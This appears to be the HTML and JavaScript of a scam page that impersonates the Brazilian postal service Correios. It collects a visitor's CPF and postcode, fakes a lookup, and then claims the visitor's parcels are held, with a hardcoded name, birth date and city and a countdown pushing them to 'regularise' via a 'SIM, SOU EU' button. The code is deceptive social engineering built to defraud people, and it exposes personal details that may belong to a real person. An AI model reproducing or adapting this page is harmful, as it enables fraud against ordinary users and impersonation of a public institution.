<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  <link rel="stylesheet" href="css/bootstrap.css" />
  <link rel="stylesheet" href="css/app.css" />
  <link rel="stylesheet" href="css/yellow.css" />
  <link rel="icon" type="image/x-icon" href="../wp-content/uploads/2024/11/regular_correios-logo-2.png" />
  <script src="../scripts/utms/latest.js" data-utmify-prevent-subids="" async defer></script>
  <title>Correios | Rastreio</title>

  <style>
    @keyframes pulsar {
      0% {
        transform: scale(1);
      }

      50% {
        transform: scale(1.1);
      }

      100% {
        transform: scale(1);
      }
    }

    #consultar-btn {
      animation: pulsar 1s infinite;
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid rgba(0, 0, 0, 0.1);
      border-top-color: #007bff;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    main {
      max-width: 1000px;
      margin: 2rem auto;
      padding: 0 1rem;
    }

    #resultado {
      background: #f8f9fa;
      border-radius: 10px;
      padding: 2rem;
      font-family: Arial, sans-serif;
      color: #003157;
      box-shadow: 0 0 10px rgb(0 0 0 / 0.1);
    }

    #resultado h2 {
      font-weight: 700;
      margin-bottom: 1rem;
      color: #003157;
    }

    #resultado p {
      font-size: 1.1rem;
      margin: 0.5rem 0;
    }

    #resultado p span {
      font-weight: 700;
      color: #007bff;
    }

    #res-prazo {
      display: block;
      text-align: center;
      color: red;
      font-size: 1.3rem;
      margin-top: 1rem;
    }

    #botao-confirmar {
      display: block;
      margin: 20px auto 0 auto;
      padding: 10px 20px;
      background-color: #007bff;
      color: #fff;
      border: none;
      border-radius: 5px;
      font-size: 1.1rem;
      cursor: pointer;
    }
  </style>
</head>

<body>
  <header>
    <!-- Seu cabeÃ§alho mantido -->
  </header>

  <main>
    <!-- FormulÃ¡rio -->
    <section id="tela-formulario">
      <!-- ConteÃºdo do formulÃ¡rio mantido -->
      <form id="form-rastreamento">
        <!-- Campos CPF e CEP -->
        <!-- BotÃ£o + Spinner -->
        <div id="botao-container">
          <button type="submit" class="btn btn-primary" id="consultar-btn">Consultar</button>
        </div>
        <div id="loading-container" style="display: none; text-align: center; margin-top: 20px;">
          <p style="font-size: 16px; color: #333;">Consultando seus dados...</p>
          <div class="spinner"></div>
        </div>
      </form>
    </section>

    <!-- Resultado -->
    <section id="resultado" style="display: none;">
      <h2>Encontramos pedidos retidos em uma de nossas agÃªncias. ðŸ“¦</h2>
      <p><span>Nome:</span> <span id="res-nome"></span></p>
      <p><span>CPF:</span> <span id="res-cpf"></span></p>
      <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
      <p><span>CEP:</span> <span id="res-cep"></span></p>
      <p><span>Rua:</span> <span id="res-rua"></span></p>
      <p><span>Bairro:</span> <span id="res-bairro"></span></p>
      <p><span>Cidade:</span> <span id="res-cidade"></span></p>
      <p><span>Estado:</span> <span id="res-estado"></span></p>
      <p><span>Prazo para RegularizaÃ§Ã£o:</span></p>
      <p id="res-prazo">Carregando prazo...</p>

      <button id="botao-confirmar">SIM, SOU EU</button>
    </section>
  </main>

  <footer>
    <!-- RodapÃ© mantido -->
  </footer>

  <script>
    function formatarCPF(cpf) {
      return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
    }

    function formatarCEP(cep) {
      return cep.replace(/(\d{5})(\d{3})/, "$1-$2");
    }

    function atualizarContagem(prazoFinal) {
      const prazoElemento = document.getElementById("res-prazo");
      const interval = setInterval(() => {
        const agora = new Date().getTime();
        const distancia = prazoFinal - agora;

        if (distancia <= 0) {
          clearInterval(interval);
          prazoElemento.innerHTML = "Prazo expirado!";
          return;
        }

        const dias = Math.floor(distancia / (1000 * 60 * 60 * 24));
        const horas = Math.floor((distancia % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        const minutos = Math.floor((distancia % (1000 * 60 * 60)) / (1000 * 60));
        const segundos = Math.floor((distancia % (1000 * 60)) / 1000);

        prazoElemento.innerHTML = `${dias}d ${horas}h ${minutos}m ${segundos}s restantes`;
      }, 1000);
    }

    document.getElementById("form-rastreamento").addEventListener("submit", async function (event) {
      event.preventDefault();

      const cpfInput = document.getElementById("cpf").value.replace(/\D/g, "");
      const cepInput = document.getElementById("cep").value.replace(/\D/g, "");

      if (cpfInput.length !== 11) {
        alert("Por favor, insira um CPF vÃ¡lido.");
        return;
      }

      if (cepInput.length !== 8) {
        alert("Por favor, insira um CEP vÃ¡lido.");
        return;
      }

      document.getElementById("botao-container").style.display = "none";
      document.getElementById("loading-container").style.display = "block";

      await new Promise((resolve) => setTimeout(resolve, 2000));

      const prazoFinal = new Date();
      prazoFinal.setDate(prazoFinal.getDate() + 10);
      prazoFinal.setHours(23, 59, 0, 0);

      document.getElementById("res-nome").textContent = "Rosiane Oliveira Da Silva";
      document.getElementById("res-cpf").textContent = formatarCPF(cpfInput);
      document.getElementById("res-nascimento").textContent = "27/01/1985";
      document.getElementById("res-cep").textContent = formatarCEP(cepInput);
      document.getElementById("res-rua").textContent = "";      // Rua em branco
      document.getElementById("res-bairro").textContent = "";   // Bairro em branco
      document.getElementById("res-cidade").textContent = "PorciÃºncula";
      document.getElementById("res-estado").textContent = "RJ";

      atualizarContagem(prazoFinal);

      document.getElementById("loading-container").style.display = "none";
      document.getElementById("tela-formulario").style.display = "none";
      document.getElementById("resultado").style.display = "block";
    });
  </script>
</body>

</html>
